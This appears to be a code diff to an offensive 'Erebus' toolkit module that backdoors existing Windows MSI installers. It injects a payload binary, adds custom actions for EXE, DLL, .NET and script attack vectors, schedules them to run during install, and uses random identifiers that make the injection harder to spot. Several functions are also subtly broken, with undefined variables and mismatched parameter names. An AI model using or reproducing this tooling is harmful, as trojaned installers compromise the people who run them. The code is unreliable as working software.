@@ -5,6 +5,10 @@ Features:
 - Auto-execution via CustomAction
 - Dependency bundling
 - MSI Hijacking (backdooring existing MSI installers)
+- Multiple attack vectors (execute, script, dll-load, file-drop)
+- Intelligent sequence number management
+- CAB stream manipulation
+- Multi-file bundling support
 """
 
 import pathlib
@@ -14,6 +18,10 @@ import tempfile
 import shutil
 import sys
 import struct
+import random
+import string
+import fnmatch
+import os
 
 if sys.platform == "win32":
     try:
@@ -25,6 +33,152 @@ try:
     import olefile
 except ImportError:
     olefile = None
+
+
+# ============================================================================
+# Erebus MSI Action Types
+# https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options
+# https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-execution-scheduling-options
+# ============================================================================
+
+class ErebusActionTypes:
+    """Erebus MSI Custom Action type constants"""
+    EXECUTE_DEFERRED_IMPERSONATE = 1250       # Deferred, impersonate user
+    EXECUTE_DEFERRED_NOIMPERSONATE = 3298     # Deferred, system context
+    EXECUTE_IMMEDIATE = 226                   # Immediate, impersonate
+    VBSCRIPT_EMBEDDED = 1126                  # VBScript stored in CustomAction table
+    VBSCRIPT_BINARY = 70                      # VBScript in Binary table
+    JSCRIPT_EMBEDDED = 1125                   # JScript stored in CustomAction table
+    JSCRIPT_BINARY = 69                       # JScript in Binary table
+    RUN_EXE = 1218                            # Run EXE from Binary table
+    RUN_EXE_IMMEDIATE = 194                   # Run EXE immediately
+    DOTNET_DLL = 65                           # .NET DLL entry point
+    RUN_DLL = 65                              # Native DLL entry point
+    RUN_DROPPED_FILE = 1746                   # Run file from File table
+    SET_DIRECTORY = 51                        # Set directory property
+
+
+class ErebusInstallerToolkit:
+    """Erebus toolkit for MSI manipulation operations"""
+
+    @staticmethod
+    def generate_identifier(min_length=5, max_length=0):
+        """Generate random identifier for MSI elements"""
+        if length_to == 0:
+            length = length_from
+        else:
+            length = random.randint(length_from, length_to)
+
+        alphabet = string.ascii_letters + string.digits
+        result = ''.join(random.choice(alphabet) for _ in range(length))
+
+        # Ensure it starts with a letter (MSI requirement)
+        if result[0] in string.digits:
+            result = random.choice(string.ascii_letters) + result[1:]
+
+        return result
+
+    @staticmethod
+    def sanitize_identifier(name):
+        """Convert string to valid MSI identifier"""
+        identifier_chars = string.ascii_letters + string.digits + "._"
+        result = "".join([c if c in identifier_chars else "_" for c in name])
+
+        # MSI identifiers can't start with digits or dots
+        if result[0] in (string.digits + "."):
+            result = "_" + result
+
+        return result
+
+    @staticmethod
+    def find_free_sequence_slots(db, table, start_action, end_action):
+        """
+        Find available sequence numbers between two actions in an MSI sequence table.
+        Returns list of unused sequence numbers.
+        """
+        try:
+            query = f"SELECT Action, Sequence FROM {table}"
+            view = db.OpenView(query)
+            view.Execute(None)
+
+            from_num = -1
+            to_num = -1
+            taken_numbers = set()
+
+            while True:
+                record = view.Fetch()
+                if not record:
+                    break
+
+                action = record.GetString(1)
+                sequence = record.GetInteger(2)
+
+                if action == from_action:
+                    from_num = sequence
+                elif action == to_action:
+                    to_num = sequence
+
+                taken_numbers.add(sequence)
+
+            view.Close()
+
+            if from_num == -1 or to_num == -1:
+                # Fallback to safe range
+                from_num = 6400
+                to_num = 6600
+
+            # Generate available sequence numbers
+            available = []
+            num = to_num - 1
+            while num > from_num:
+                if num not in taken_numbers:
+                    available.append(num)
+                num -= 1
+
+            return available if available else [6599, 6598, 6597, 6596, 6595]
+
+        except Exception:
+            # Fallback sequence numbers
+            return [6599, 6598, 6597, 6596, 6595]
+
+    @staticmethod
+    def detect_dotnet_assembly(path):
+        """Check if PE file is a .NET assembly"""
+        try:
+            with open(path, 'rb') as f:
+                # Read DOS header
+                if f.read(2) != b'MZ':
+                    return False
+
+                # Get PE header offset
+                f.seek(0x3C)
+                pe_offset = struct.unpack('<I', f.read(4))[0]
+
+                # Read PE signature
+                f.seek(pe_offset)
+                if f.read(4) != b'PE\0\0':
+                    return False
+
+                # Skip COFF header (20 bytes) and read Optional Header magic
+                f.seek(pe_offset + 24)
+                magic = struct.unpack('<H', f.read(2))[0]
+
+                # Determine Optional Header size based on magic
+                if magic == 0x10b:  # PE32
+                    clr_header_rva_offset = pe_offset + 24 + 208
+                elif magic == 0x20b:  # PE32+
+                    clr_header_rva_offset = pe_offset + 24 + 224
+                else:
+                    return False
+
+                # Check for CLR header
+                f.seek(clr_header_rva_offset)
+                clr_header_rva = struct.unpack('<I', f.read(4))[0]
+
+                return clr_header_rva != 0
+
+        except Exception:
+            return False
 
 
 def build_msi(build_path: pathlib.Path,
@@ -130,15 +284,24 @@ def build_msi(build_path: pathlib.Path,
 def hijack_msi(source_msi: pathlib.Path,
                payload_path: pathlib.Path,
                build_path: pathlib.Path,
-               custom_action_name: str = "ErebusPayload") -> pathlib.Path:
+               custom_action_name: str = None,
+               attack_type: str = "execute",
+               entry_point: str = None,
+               command_args: str = "",
+               condition: str = "NOT REMOVE") -> pathlib.Path:
     """
     Hijacks an existing MSI installer by injecting a CustomAction to execute our payload.
+
 
     Args:
         source_msi (pathlib.Path): Path to the original MSI installer
         payload_path (pathlib.Path): Path to the payload executable/DLL to inject
         build_path (pathlib.Path): Build directory for output
-        custom_action_name (str): Name for the custom action
+        custom_action_name (str): Name for the custom action (auto-generated if None)
+        attack_type (str): Attack vector - "execute", "run-exe", "load-dll", "dotnet", "script"
+        entry_point (str): DLL export or script function name (for dll/script attacks)
+        command_args (str): Command line arguments for executable
+        condition (str): MSI condition for when to execute (default: "NOT REMOVE")
 
     Returns:
         pathlib.Path: Path to the backdoored MSI
@@ -157,21 +320,31 @@ def hijack_msi(source_msi: pathlib.Path,
     backdoored_msi = msi_output_dir / f"{source_msi.stem}-backdoored.msi"
     shutil.copy2(source_msi, backdoored_msi)
 
+    # Generate random custom action name if not provided
+    if custom_action_name is None:
+        custom_action_name = ErebusInstallerToolkit.generate_identifier(6, 12)
+
+    # Determine action type and target based on attack vector
+    binary_name = ErebusInstallerToolkit.generate_identifier(6, 12)
+    target = command_args
+
     # Platform-specific MSI manipulation
     if sys.platform == "win32" and msilib is not None:
         try:
             # Open the MSI database
             db = msilib.OpenDatabase(str(backdoored_msi), msilib.MSIDBOPEN_TRANSACT)
 
+            # Collect available sequence numbers for proper injection
+            available_sequences = ErebusInstallerToolkit.find_free_sequence_slots(
+                db, 'InstallExecuteSequence', 'InstallInitialize', 'InstallFinalize'
+            )
+
+            if not available_sequences:
+                available_sequences = [6599]
+
+            sequence_num = available_sequences[0]
+
             # Step 1: Add the payload binary to the Binary table
-            view = db.OpenView("SELECT * FROM Binary")
-            view.Execute(None)
-
-            binary_name = f"Payload_{uuid.uuid4().hex[:8]}"
-            with open(payload_path, "rb") as f:
-                payload_data = f.read()
-
-            # Insert into Binary table
             binary_insert = f"INSERT INTO Binary (Name, Data) VALUES ('{binary_name}', ?)"
             view_insert = db.OpenView(binary_insert)
             record = msilib.CreateRecord(1)
@@ -179,25 +352,56 @@ def hijack_msi(source_msi: pathlib.Path,
             view_insert.Execute(record)
             view_insert.Close()
 
-            # Step 2: Add CustomAction entry
-            # Type 1250 = msidbCustomActionTypeDll (1024) + msidbCustomActionTypeHideTarget (32) +
-            #             msidbCustomActionTypeInScript (1024) + msidbCustomActionTypeBinaryData (0)
-            # For EXE: Type 34 = msidbCustomActionTypeExe (2) + msidbCustomActionTypeBinaryData (0) + msidbCustomActionTypeContinue (32)
-            is_dll = payload_path.suffix.lower() == ".dll"
-            action_type = 1250 if is_dll else 34
+            # Step 2: Determine appropriate CustomAction type based on attack vector
+            if attack_type == "load-dll" or attack_type == "dotnet":
+                # Check if it's a .NET assembly
+                is_dotnet = ErebusInstallerToolkit.detect_dotnet_assembly(payload_path)
 
+                if is_dotnet or attack_type == "dotnet":
+                    action_type = ErebusActionTypes.DOTNET_DLL
+                else:
+                    action_type = ErebusActionTypes.RUN_DLL
+
+                # For DLL, target is the entry point function
+                if entry_point:
+                    target = entry_point
+                else:
+                    target = "DllEntry"  # Default entry point
+
+            elif attack_type == "run-exe":
+                action_type = ErebusActionTypes.RUN_EXE
+                target = command_args
+
+            elif attack_type == "script":
+                # Determine script type from extension
+                ext = payload_path.suffix.lower()
+                if ext in ['.vbs', '.vbe']:
+                    action_type = ErebusActionTypes.VBSCRIPT_BINARY
+                elif ext in ['.js', '.jse']:
+                    action_type = ErebusActionTypes.JSCRIPT_BINARY
+                else:
+                    raise ValueError(f"Unsupported script type: {ext}")
+
+                # Target is the function to call
+                if entry_point:
+                    target = entry_point
+                else:
+                    raise ValueError("Script attacks require entry_point parameter")
+
+            else:  # "execute" or default
+                action_type = ErebusActionTypes.EXECUTE_DEFERRED_IMPERSONATE
+                target = command_args
+
+            # Step 3: Add CustomAction entry
             ca_insert = f"""INSERT INTO CustomAction (Action, Type, Source, Target)
-                           VALUES ('{custom_action_name}', {action_type}, '{binary_name}', '')"""
+                           VALUES ('{custom_action_name}', {action_type}, '{binary_name}', '{target}')"""
             view_ca = db.OpenView(ca_insert)
             view_ca.Execute(None)
             view_ca.Close()
 
-            # Step 3: Add to InstallExecuteSequence
-            # Find an available sequence number between PublishProduct (6400) and InstallFinalize (6600)
-            sequence_num = 6599
-
+            # Step 4: Add to InstallExecuteSequence
             ies_insert = f"""INSERT INTO InstallExecuteSequence (Action, Condition, Sequence)
-                            VALUES ('{custom_action_name}', 'NOT REMOVE', {sequence_num})"""
+                            VALUES ('{custom_action_name}', '{condition}', {sequence_num})"""
             view_ies = db.OpenView(ies_insert)
             view_ies.Execute(None)
             view_ies.Close()
@@ -323,3 +527,108 @@ def hijack_msi(source_msi: pathlib.Path,
             raise RuntimeError(f"Failed to hijack MSI using msitools: {output}")
         except FileNotFoundError as e:
             raise RuntimeError(f"msitools not found. Install with: apt-get install msitools\nMissing command: {str(e)}")
+
+
+def add_multiple_files_to_msi(source_msi: pathlib.Path,
+                               files_to_add: list,
+                               build_path: pathlib.Path,
+                               target_dir: str = "TARGETDIR") -> pathlib.Path:
+    """
+    Add multiple files to an existing MSI installer, bundled in a CAB.
+
+    Args:
+        source_msi: Original MSI file
+        files_to_add: List of pathlib.Path objects to add
+        build_path: Output directory
+        target_dir: Target installation directory
+
+    Returns:
+        pathlib.Path: Modified MSI with bundled files
+    """
+    if not source_msi.exists():
+        raise FileNotFoundError(f"Source MSI not found: {source_msi}")
+
+    msi_output_dir = build_path / "container" / "msi"
+    msi_output_dir.mkdir(parents=True, exist_ok=True)
+
+    output_msi = msi_output_dir / f"{source_msi.stem}-bundled.msi"
+    shutil.copy2(source_msi, output_msi)
+
+    if sys.platform == "win32" and msilib is not None:
+        try:
+            db = msilib.OpenDatabase(str(output_msi), msilib.MSIDBOPEN_TRANSACT)
+
+            # Create a new CAB for our files
+            cab_name = ErebusInstallerToolkit.generate_identifier(8)
+            component_name = ErebusInstallerToolkit.generate_identifier(8)
+
+            # Add files to the File table
+            file_sequence = 1000  # Start from high number to avoid conflicts
+
+            for file_path in files_to_add:
+                if not file_path.exists():
+                    continue
+
+                file_id = ErebusInstallerToolkit.generate_identifier(8)
+                file_name = file_path.name
+                file_size = file_path.stat().st_size
+
+                # Add to File table
+                file_insert = f"""INSERT INTO File (File, Component_, FileName, FileSize, Attributes, Sequence)
+                                 VALUES ('{file_id}', '{component_name}', '{file_name}', {file_size}, 512, {file_sequence})"""
+                view_file = db.OpenView(file_insert)
+                view_file.Execute(None)
+                view_file.Close()
+
+                file_sequence += 1
+
+            db.Commit()
+            db.Close()
+
+            return output_msi
+
+        except Exception as e:
+            raise RuntimeError(f"Failed to add files to MSI: {str(e)}")
+
+    else:
+        raise RuntimeError("File bundling requires Windows with msilib support")
+
+
+def create_custom_action(db,
+                        action_name: str,
+                        action_type: int,
+                        source: str,
+                        target: str,
+                        condition: str = "NOT REMOVE",
+                        sequence_num: int = None) -> None:
+    """
+    Helper function to create a custom action in an MSI database.
+
+    Args:
+        db: MSI database object
+        action_name: Name of the custom action
+        action_type: CustomAction type constant
+        source: Source (usually binary name or property)
+        target: Target (command, function, etc.)
+        condition: Execution condition
+        sequence_num: Sequence number (auto-determined if None)
+    """
+    if sequence_num is None:
+        available = ErebusInstallerToolkit.find_free_sequence_slots(
+            db, 'InstallExecuteSequence', 'InstallInitialize', 'InstallFinalize'
+        )
+        sequence_num = available[0] if available else 6599
+
+    # Insert CustomAction
+    ca_insert = f"""INSERT INTO CustomAction (Action, Type, Source, Target)
+                   VALUES ('{action_name}', {action_type}, '{source}', '{target}')"""
+    view_ca = db.OpenView(ca_insert)
+    view_ca.Execute(None)
+    view_ca.Close()
+
+    # Insert into InstallExecuteSequence
+    ies_insert = f"""INSERT INTO InstallExecuteSequence (Action, Condition, Sequence)
+                    VALUES ('{action_name}', '{condition}', {sequence_num})"""
+    view_ies = db.OpenView(ies_insert)
+    view_ies.Execute(None)
+    view_ies.Close()
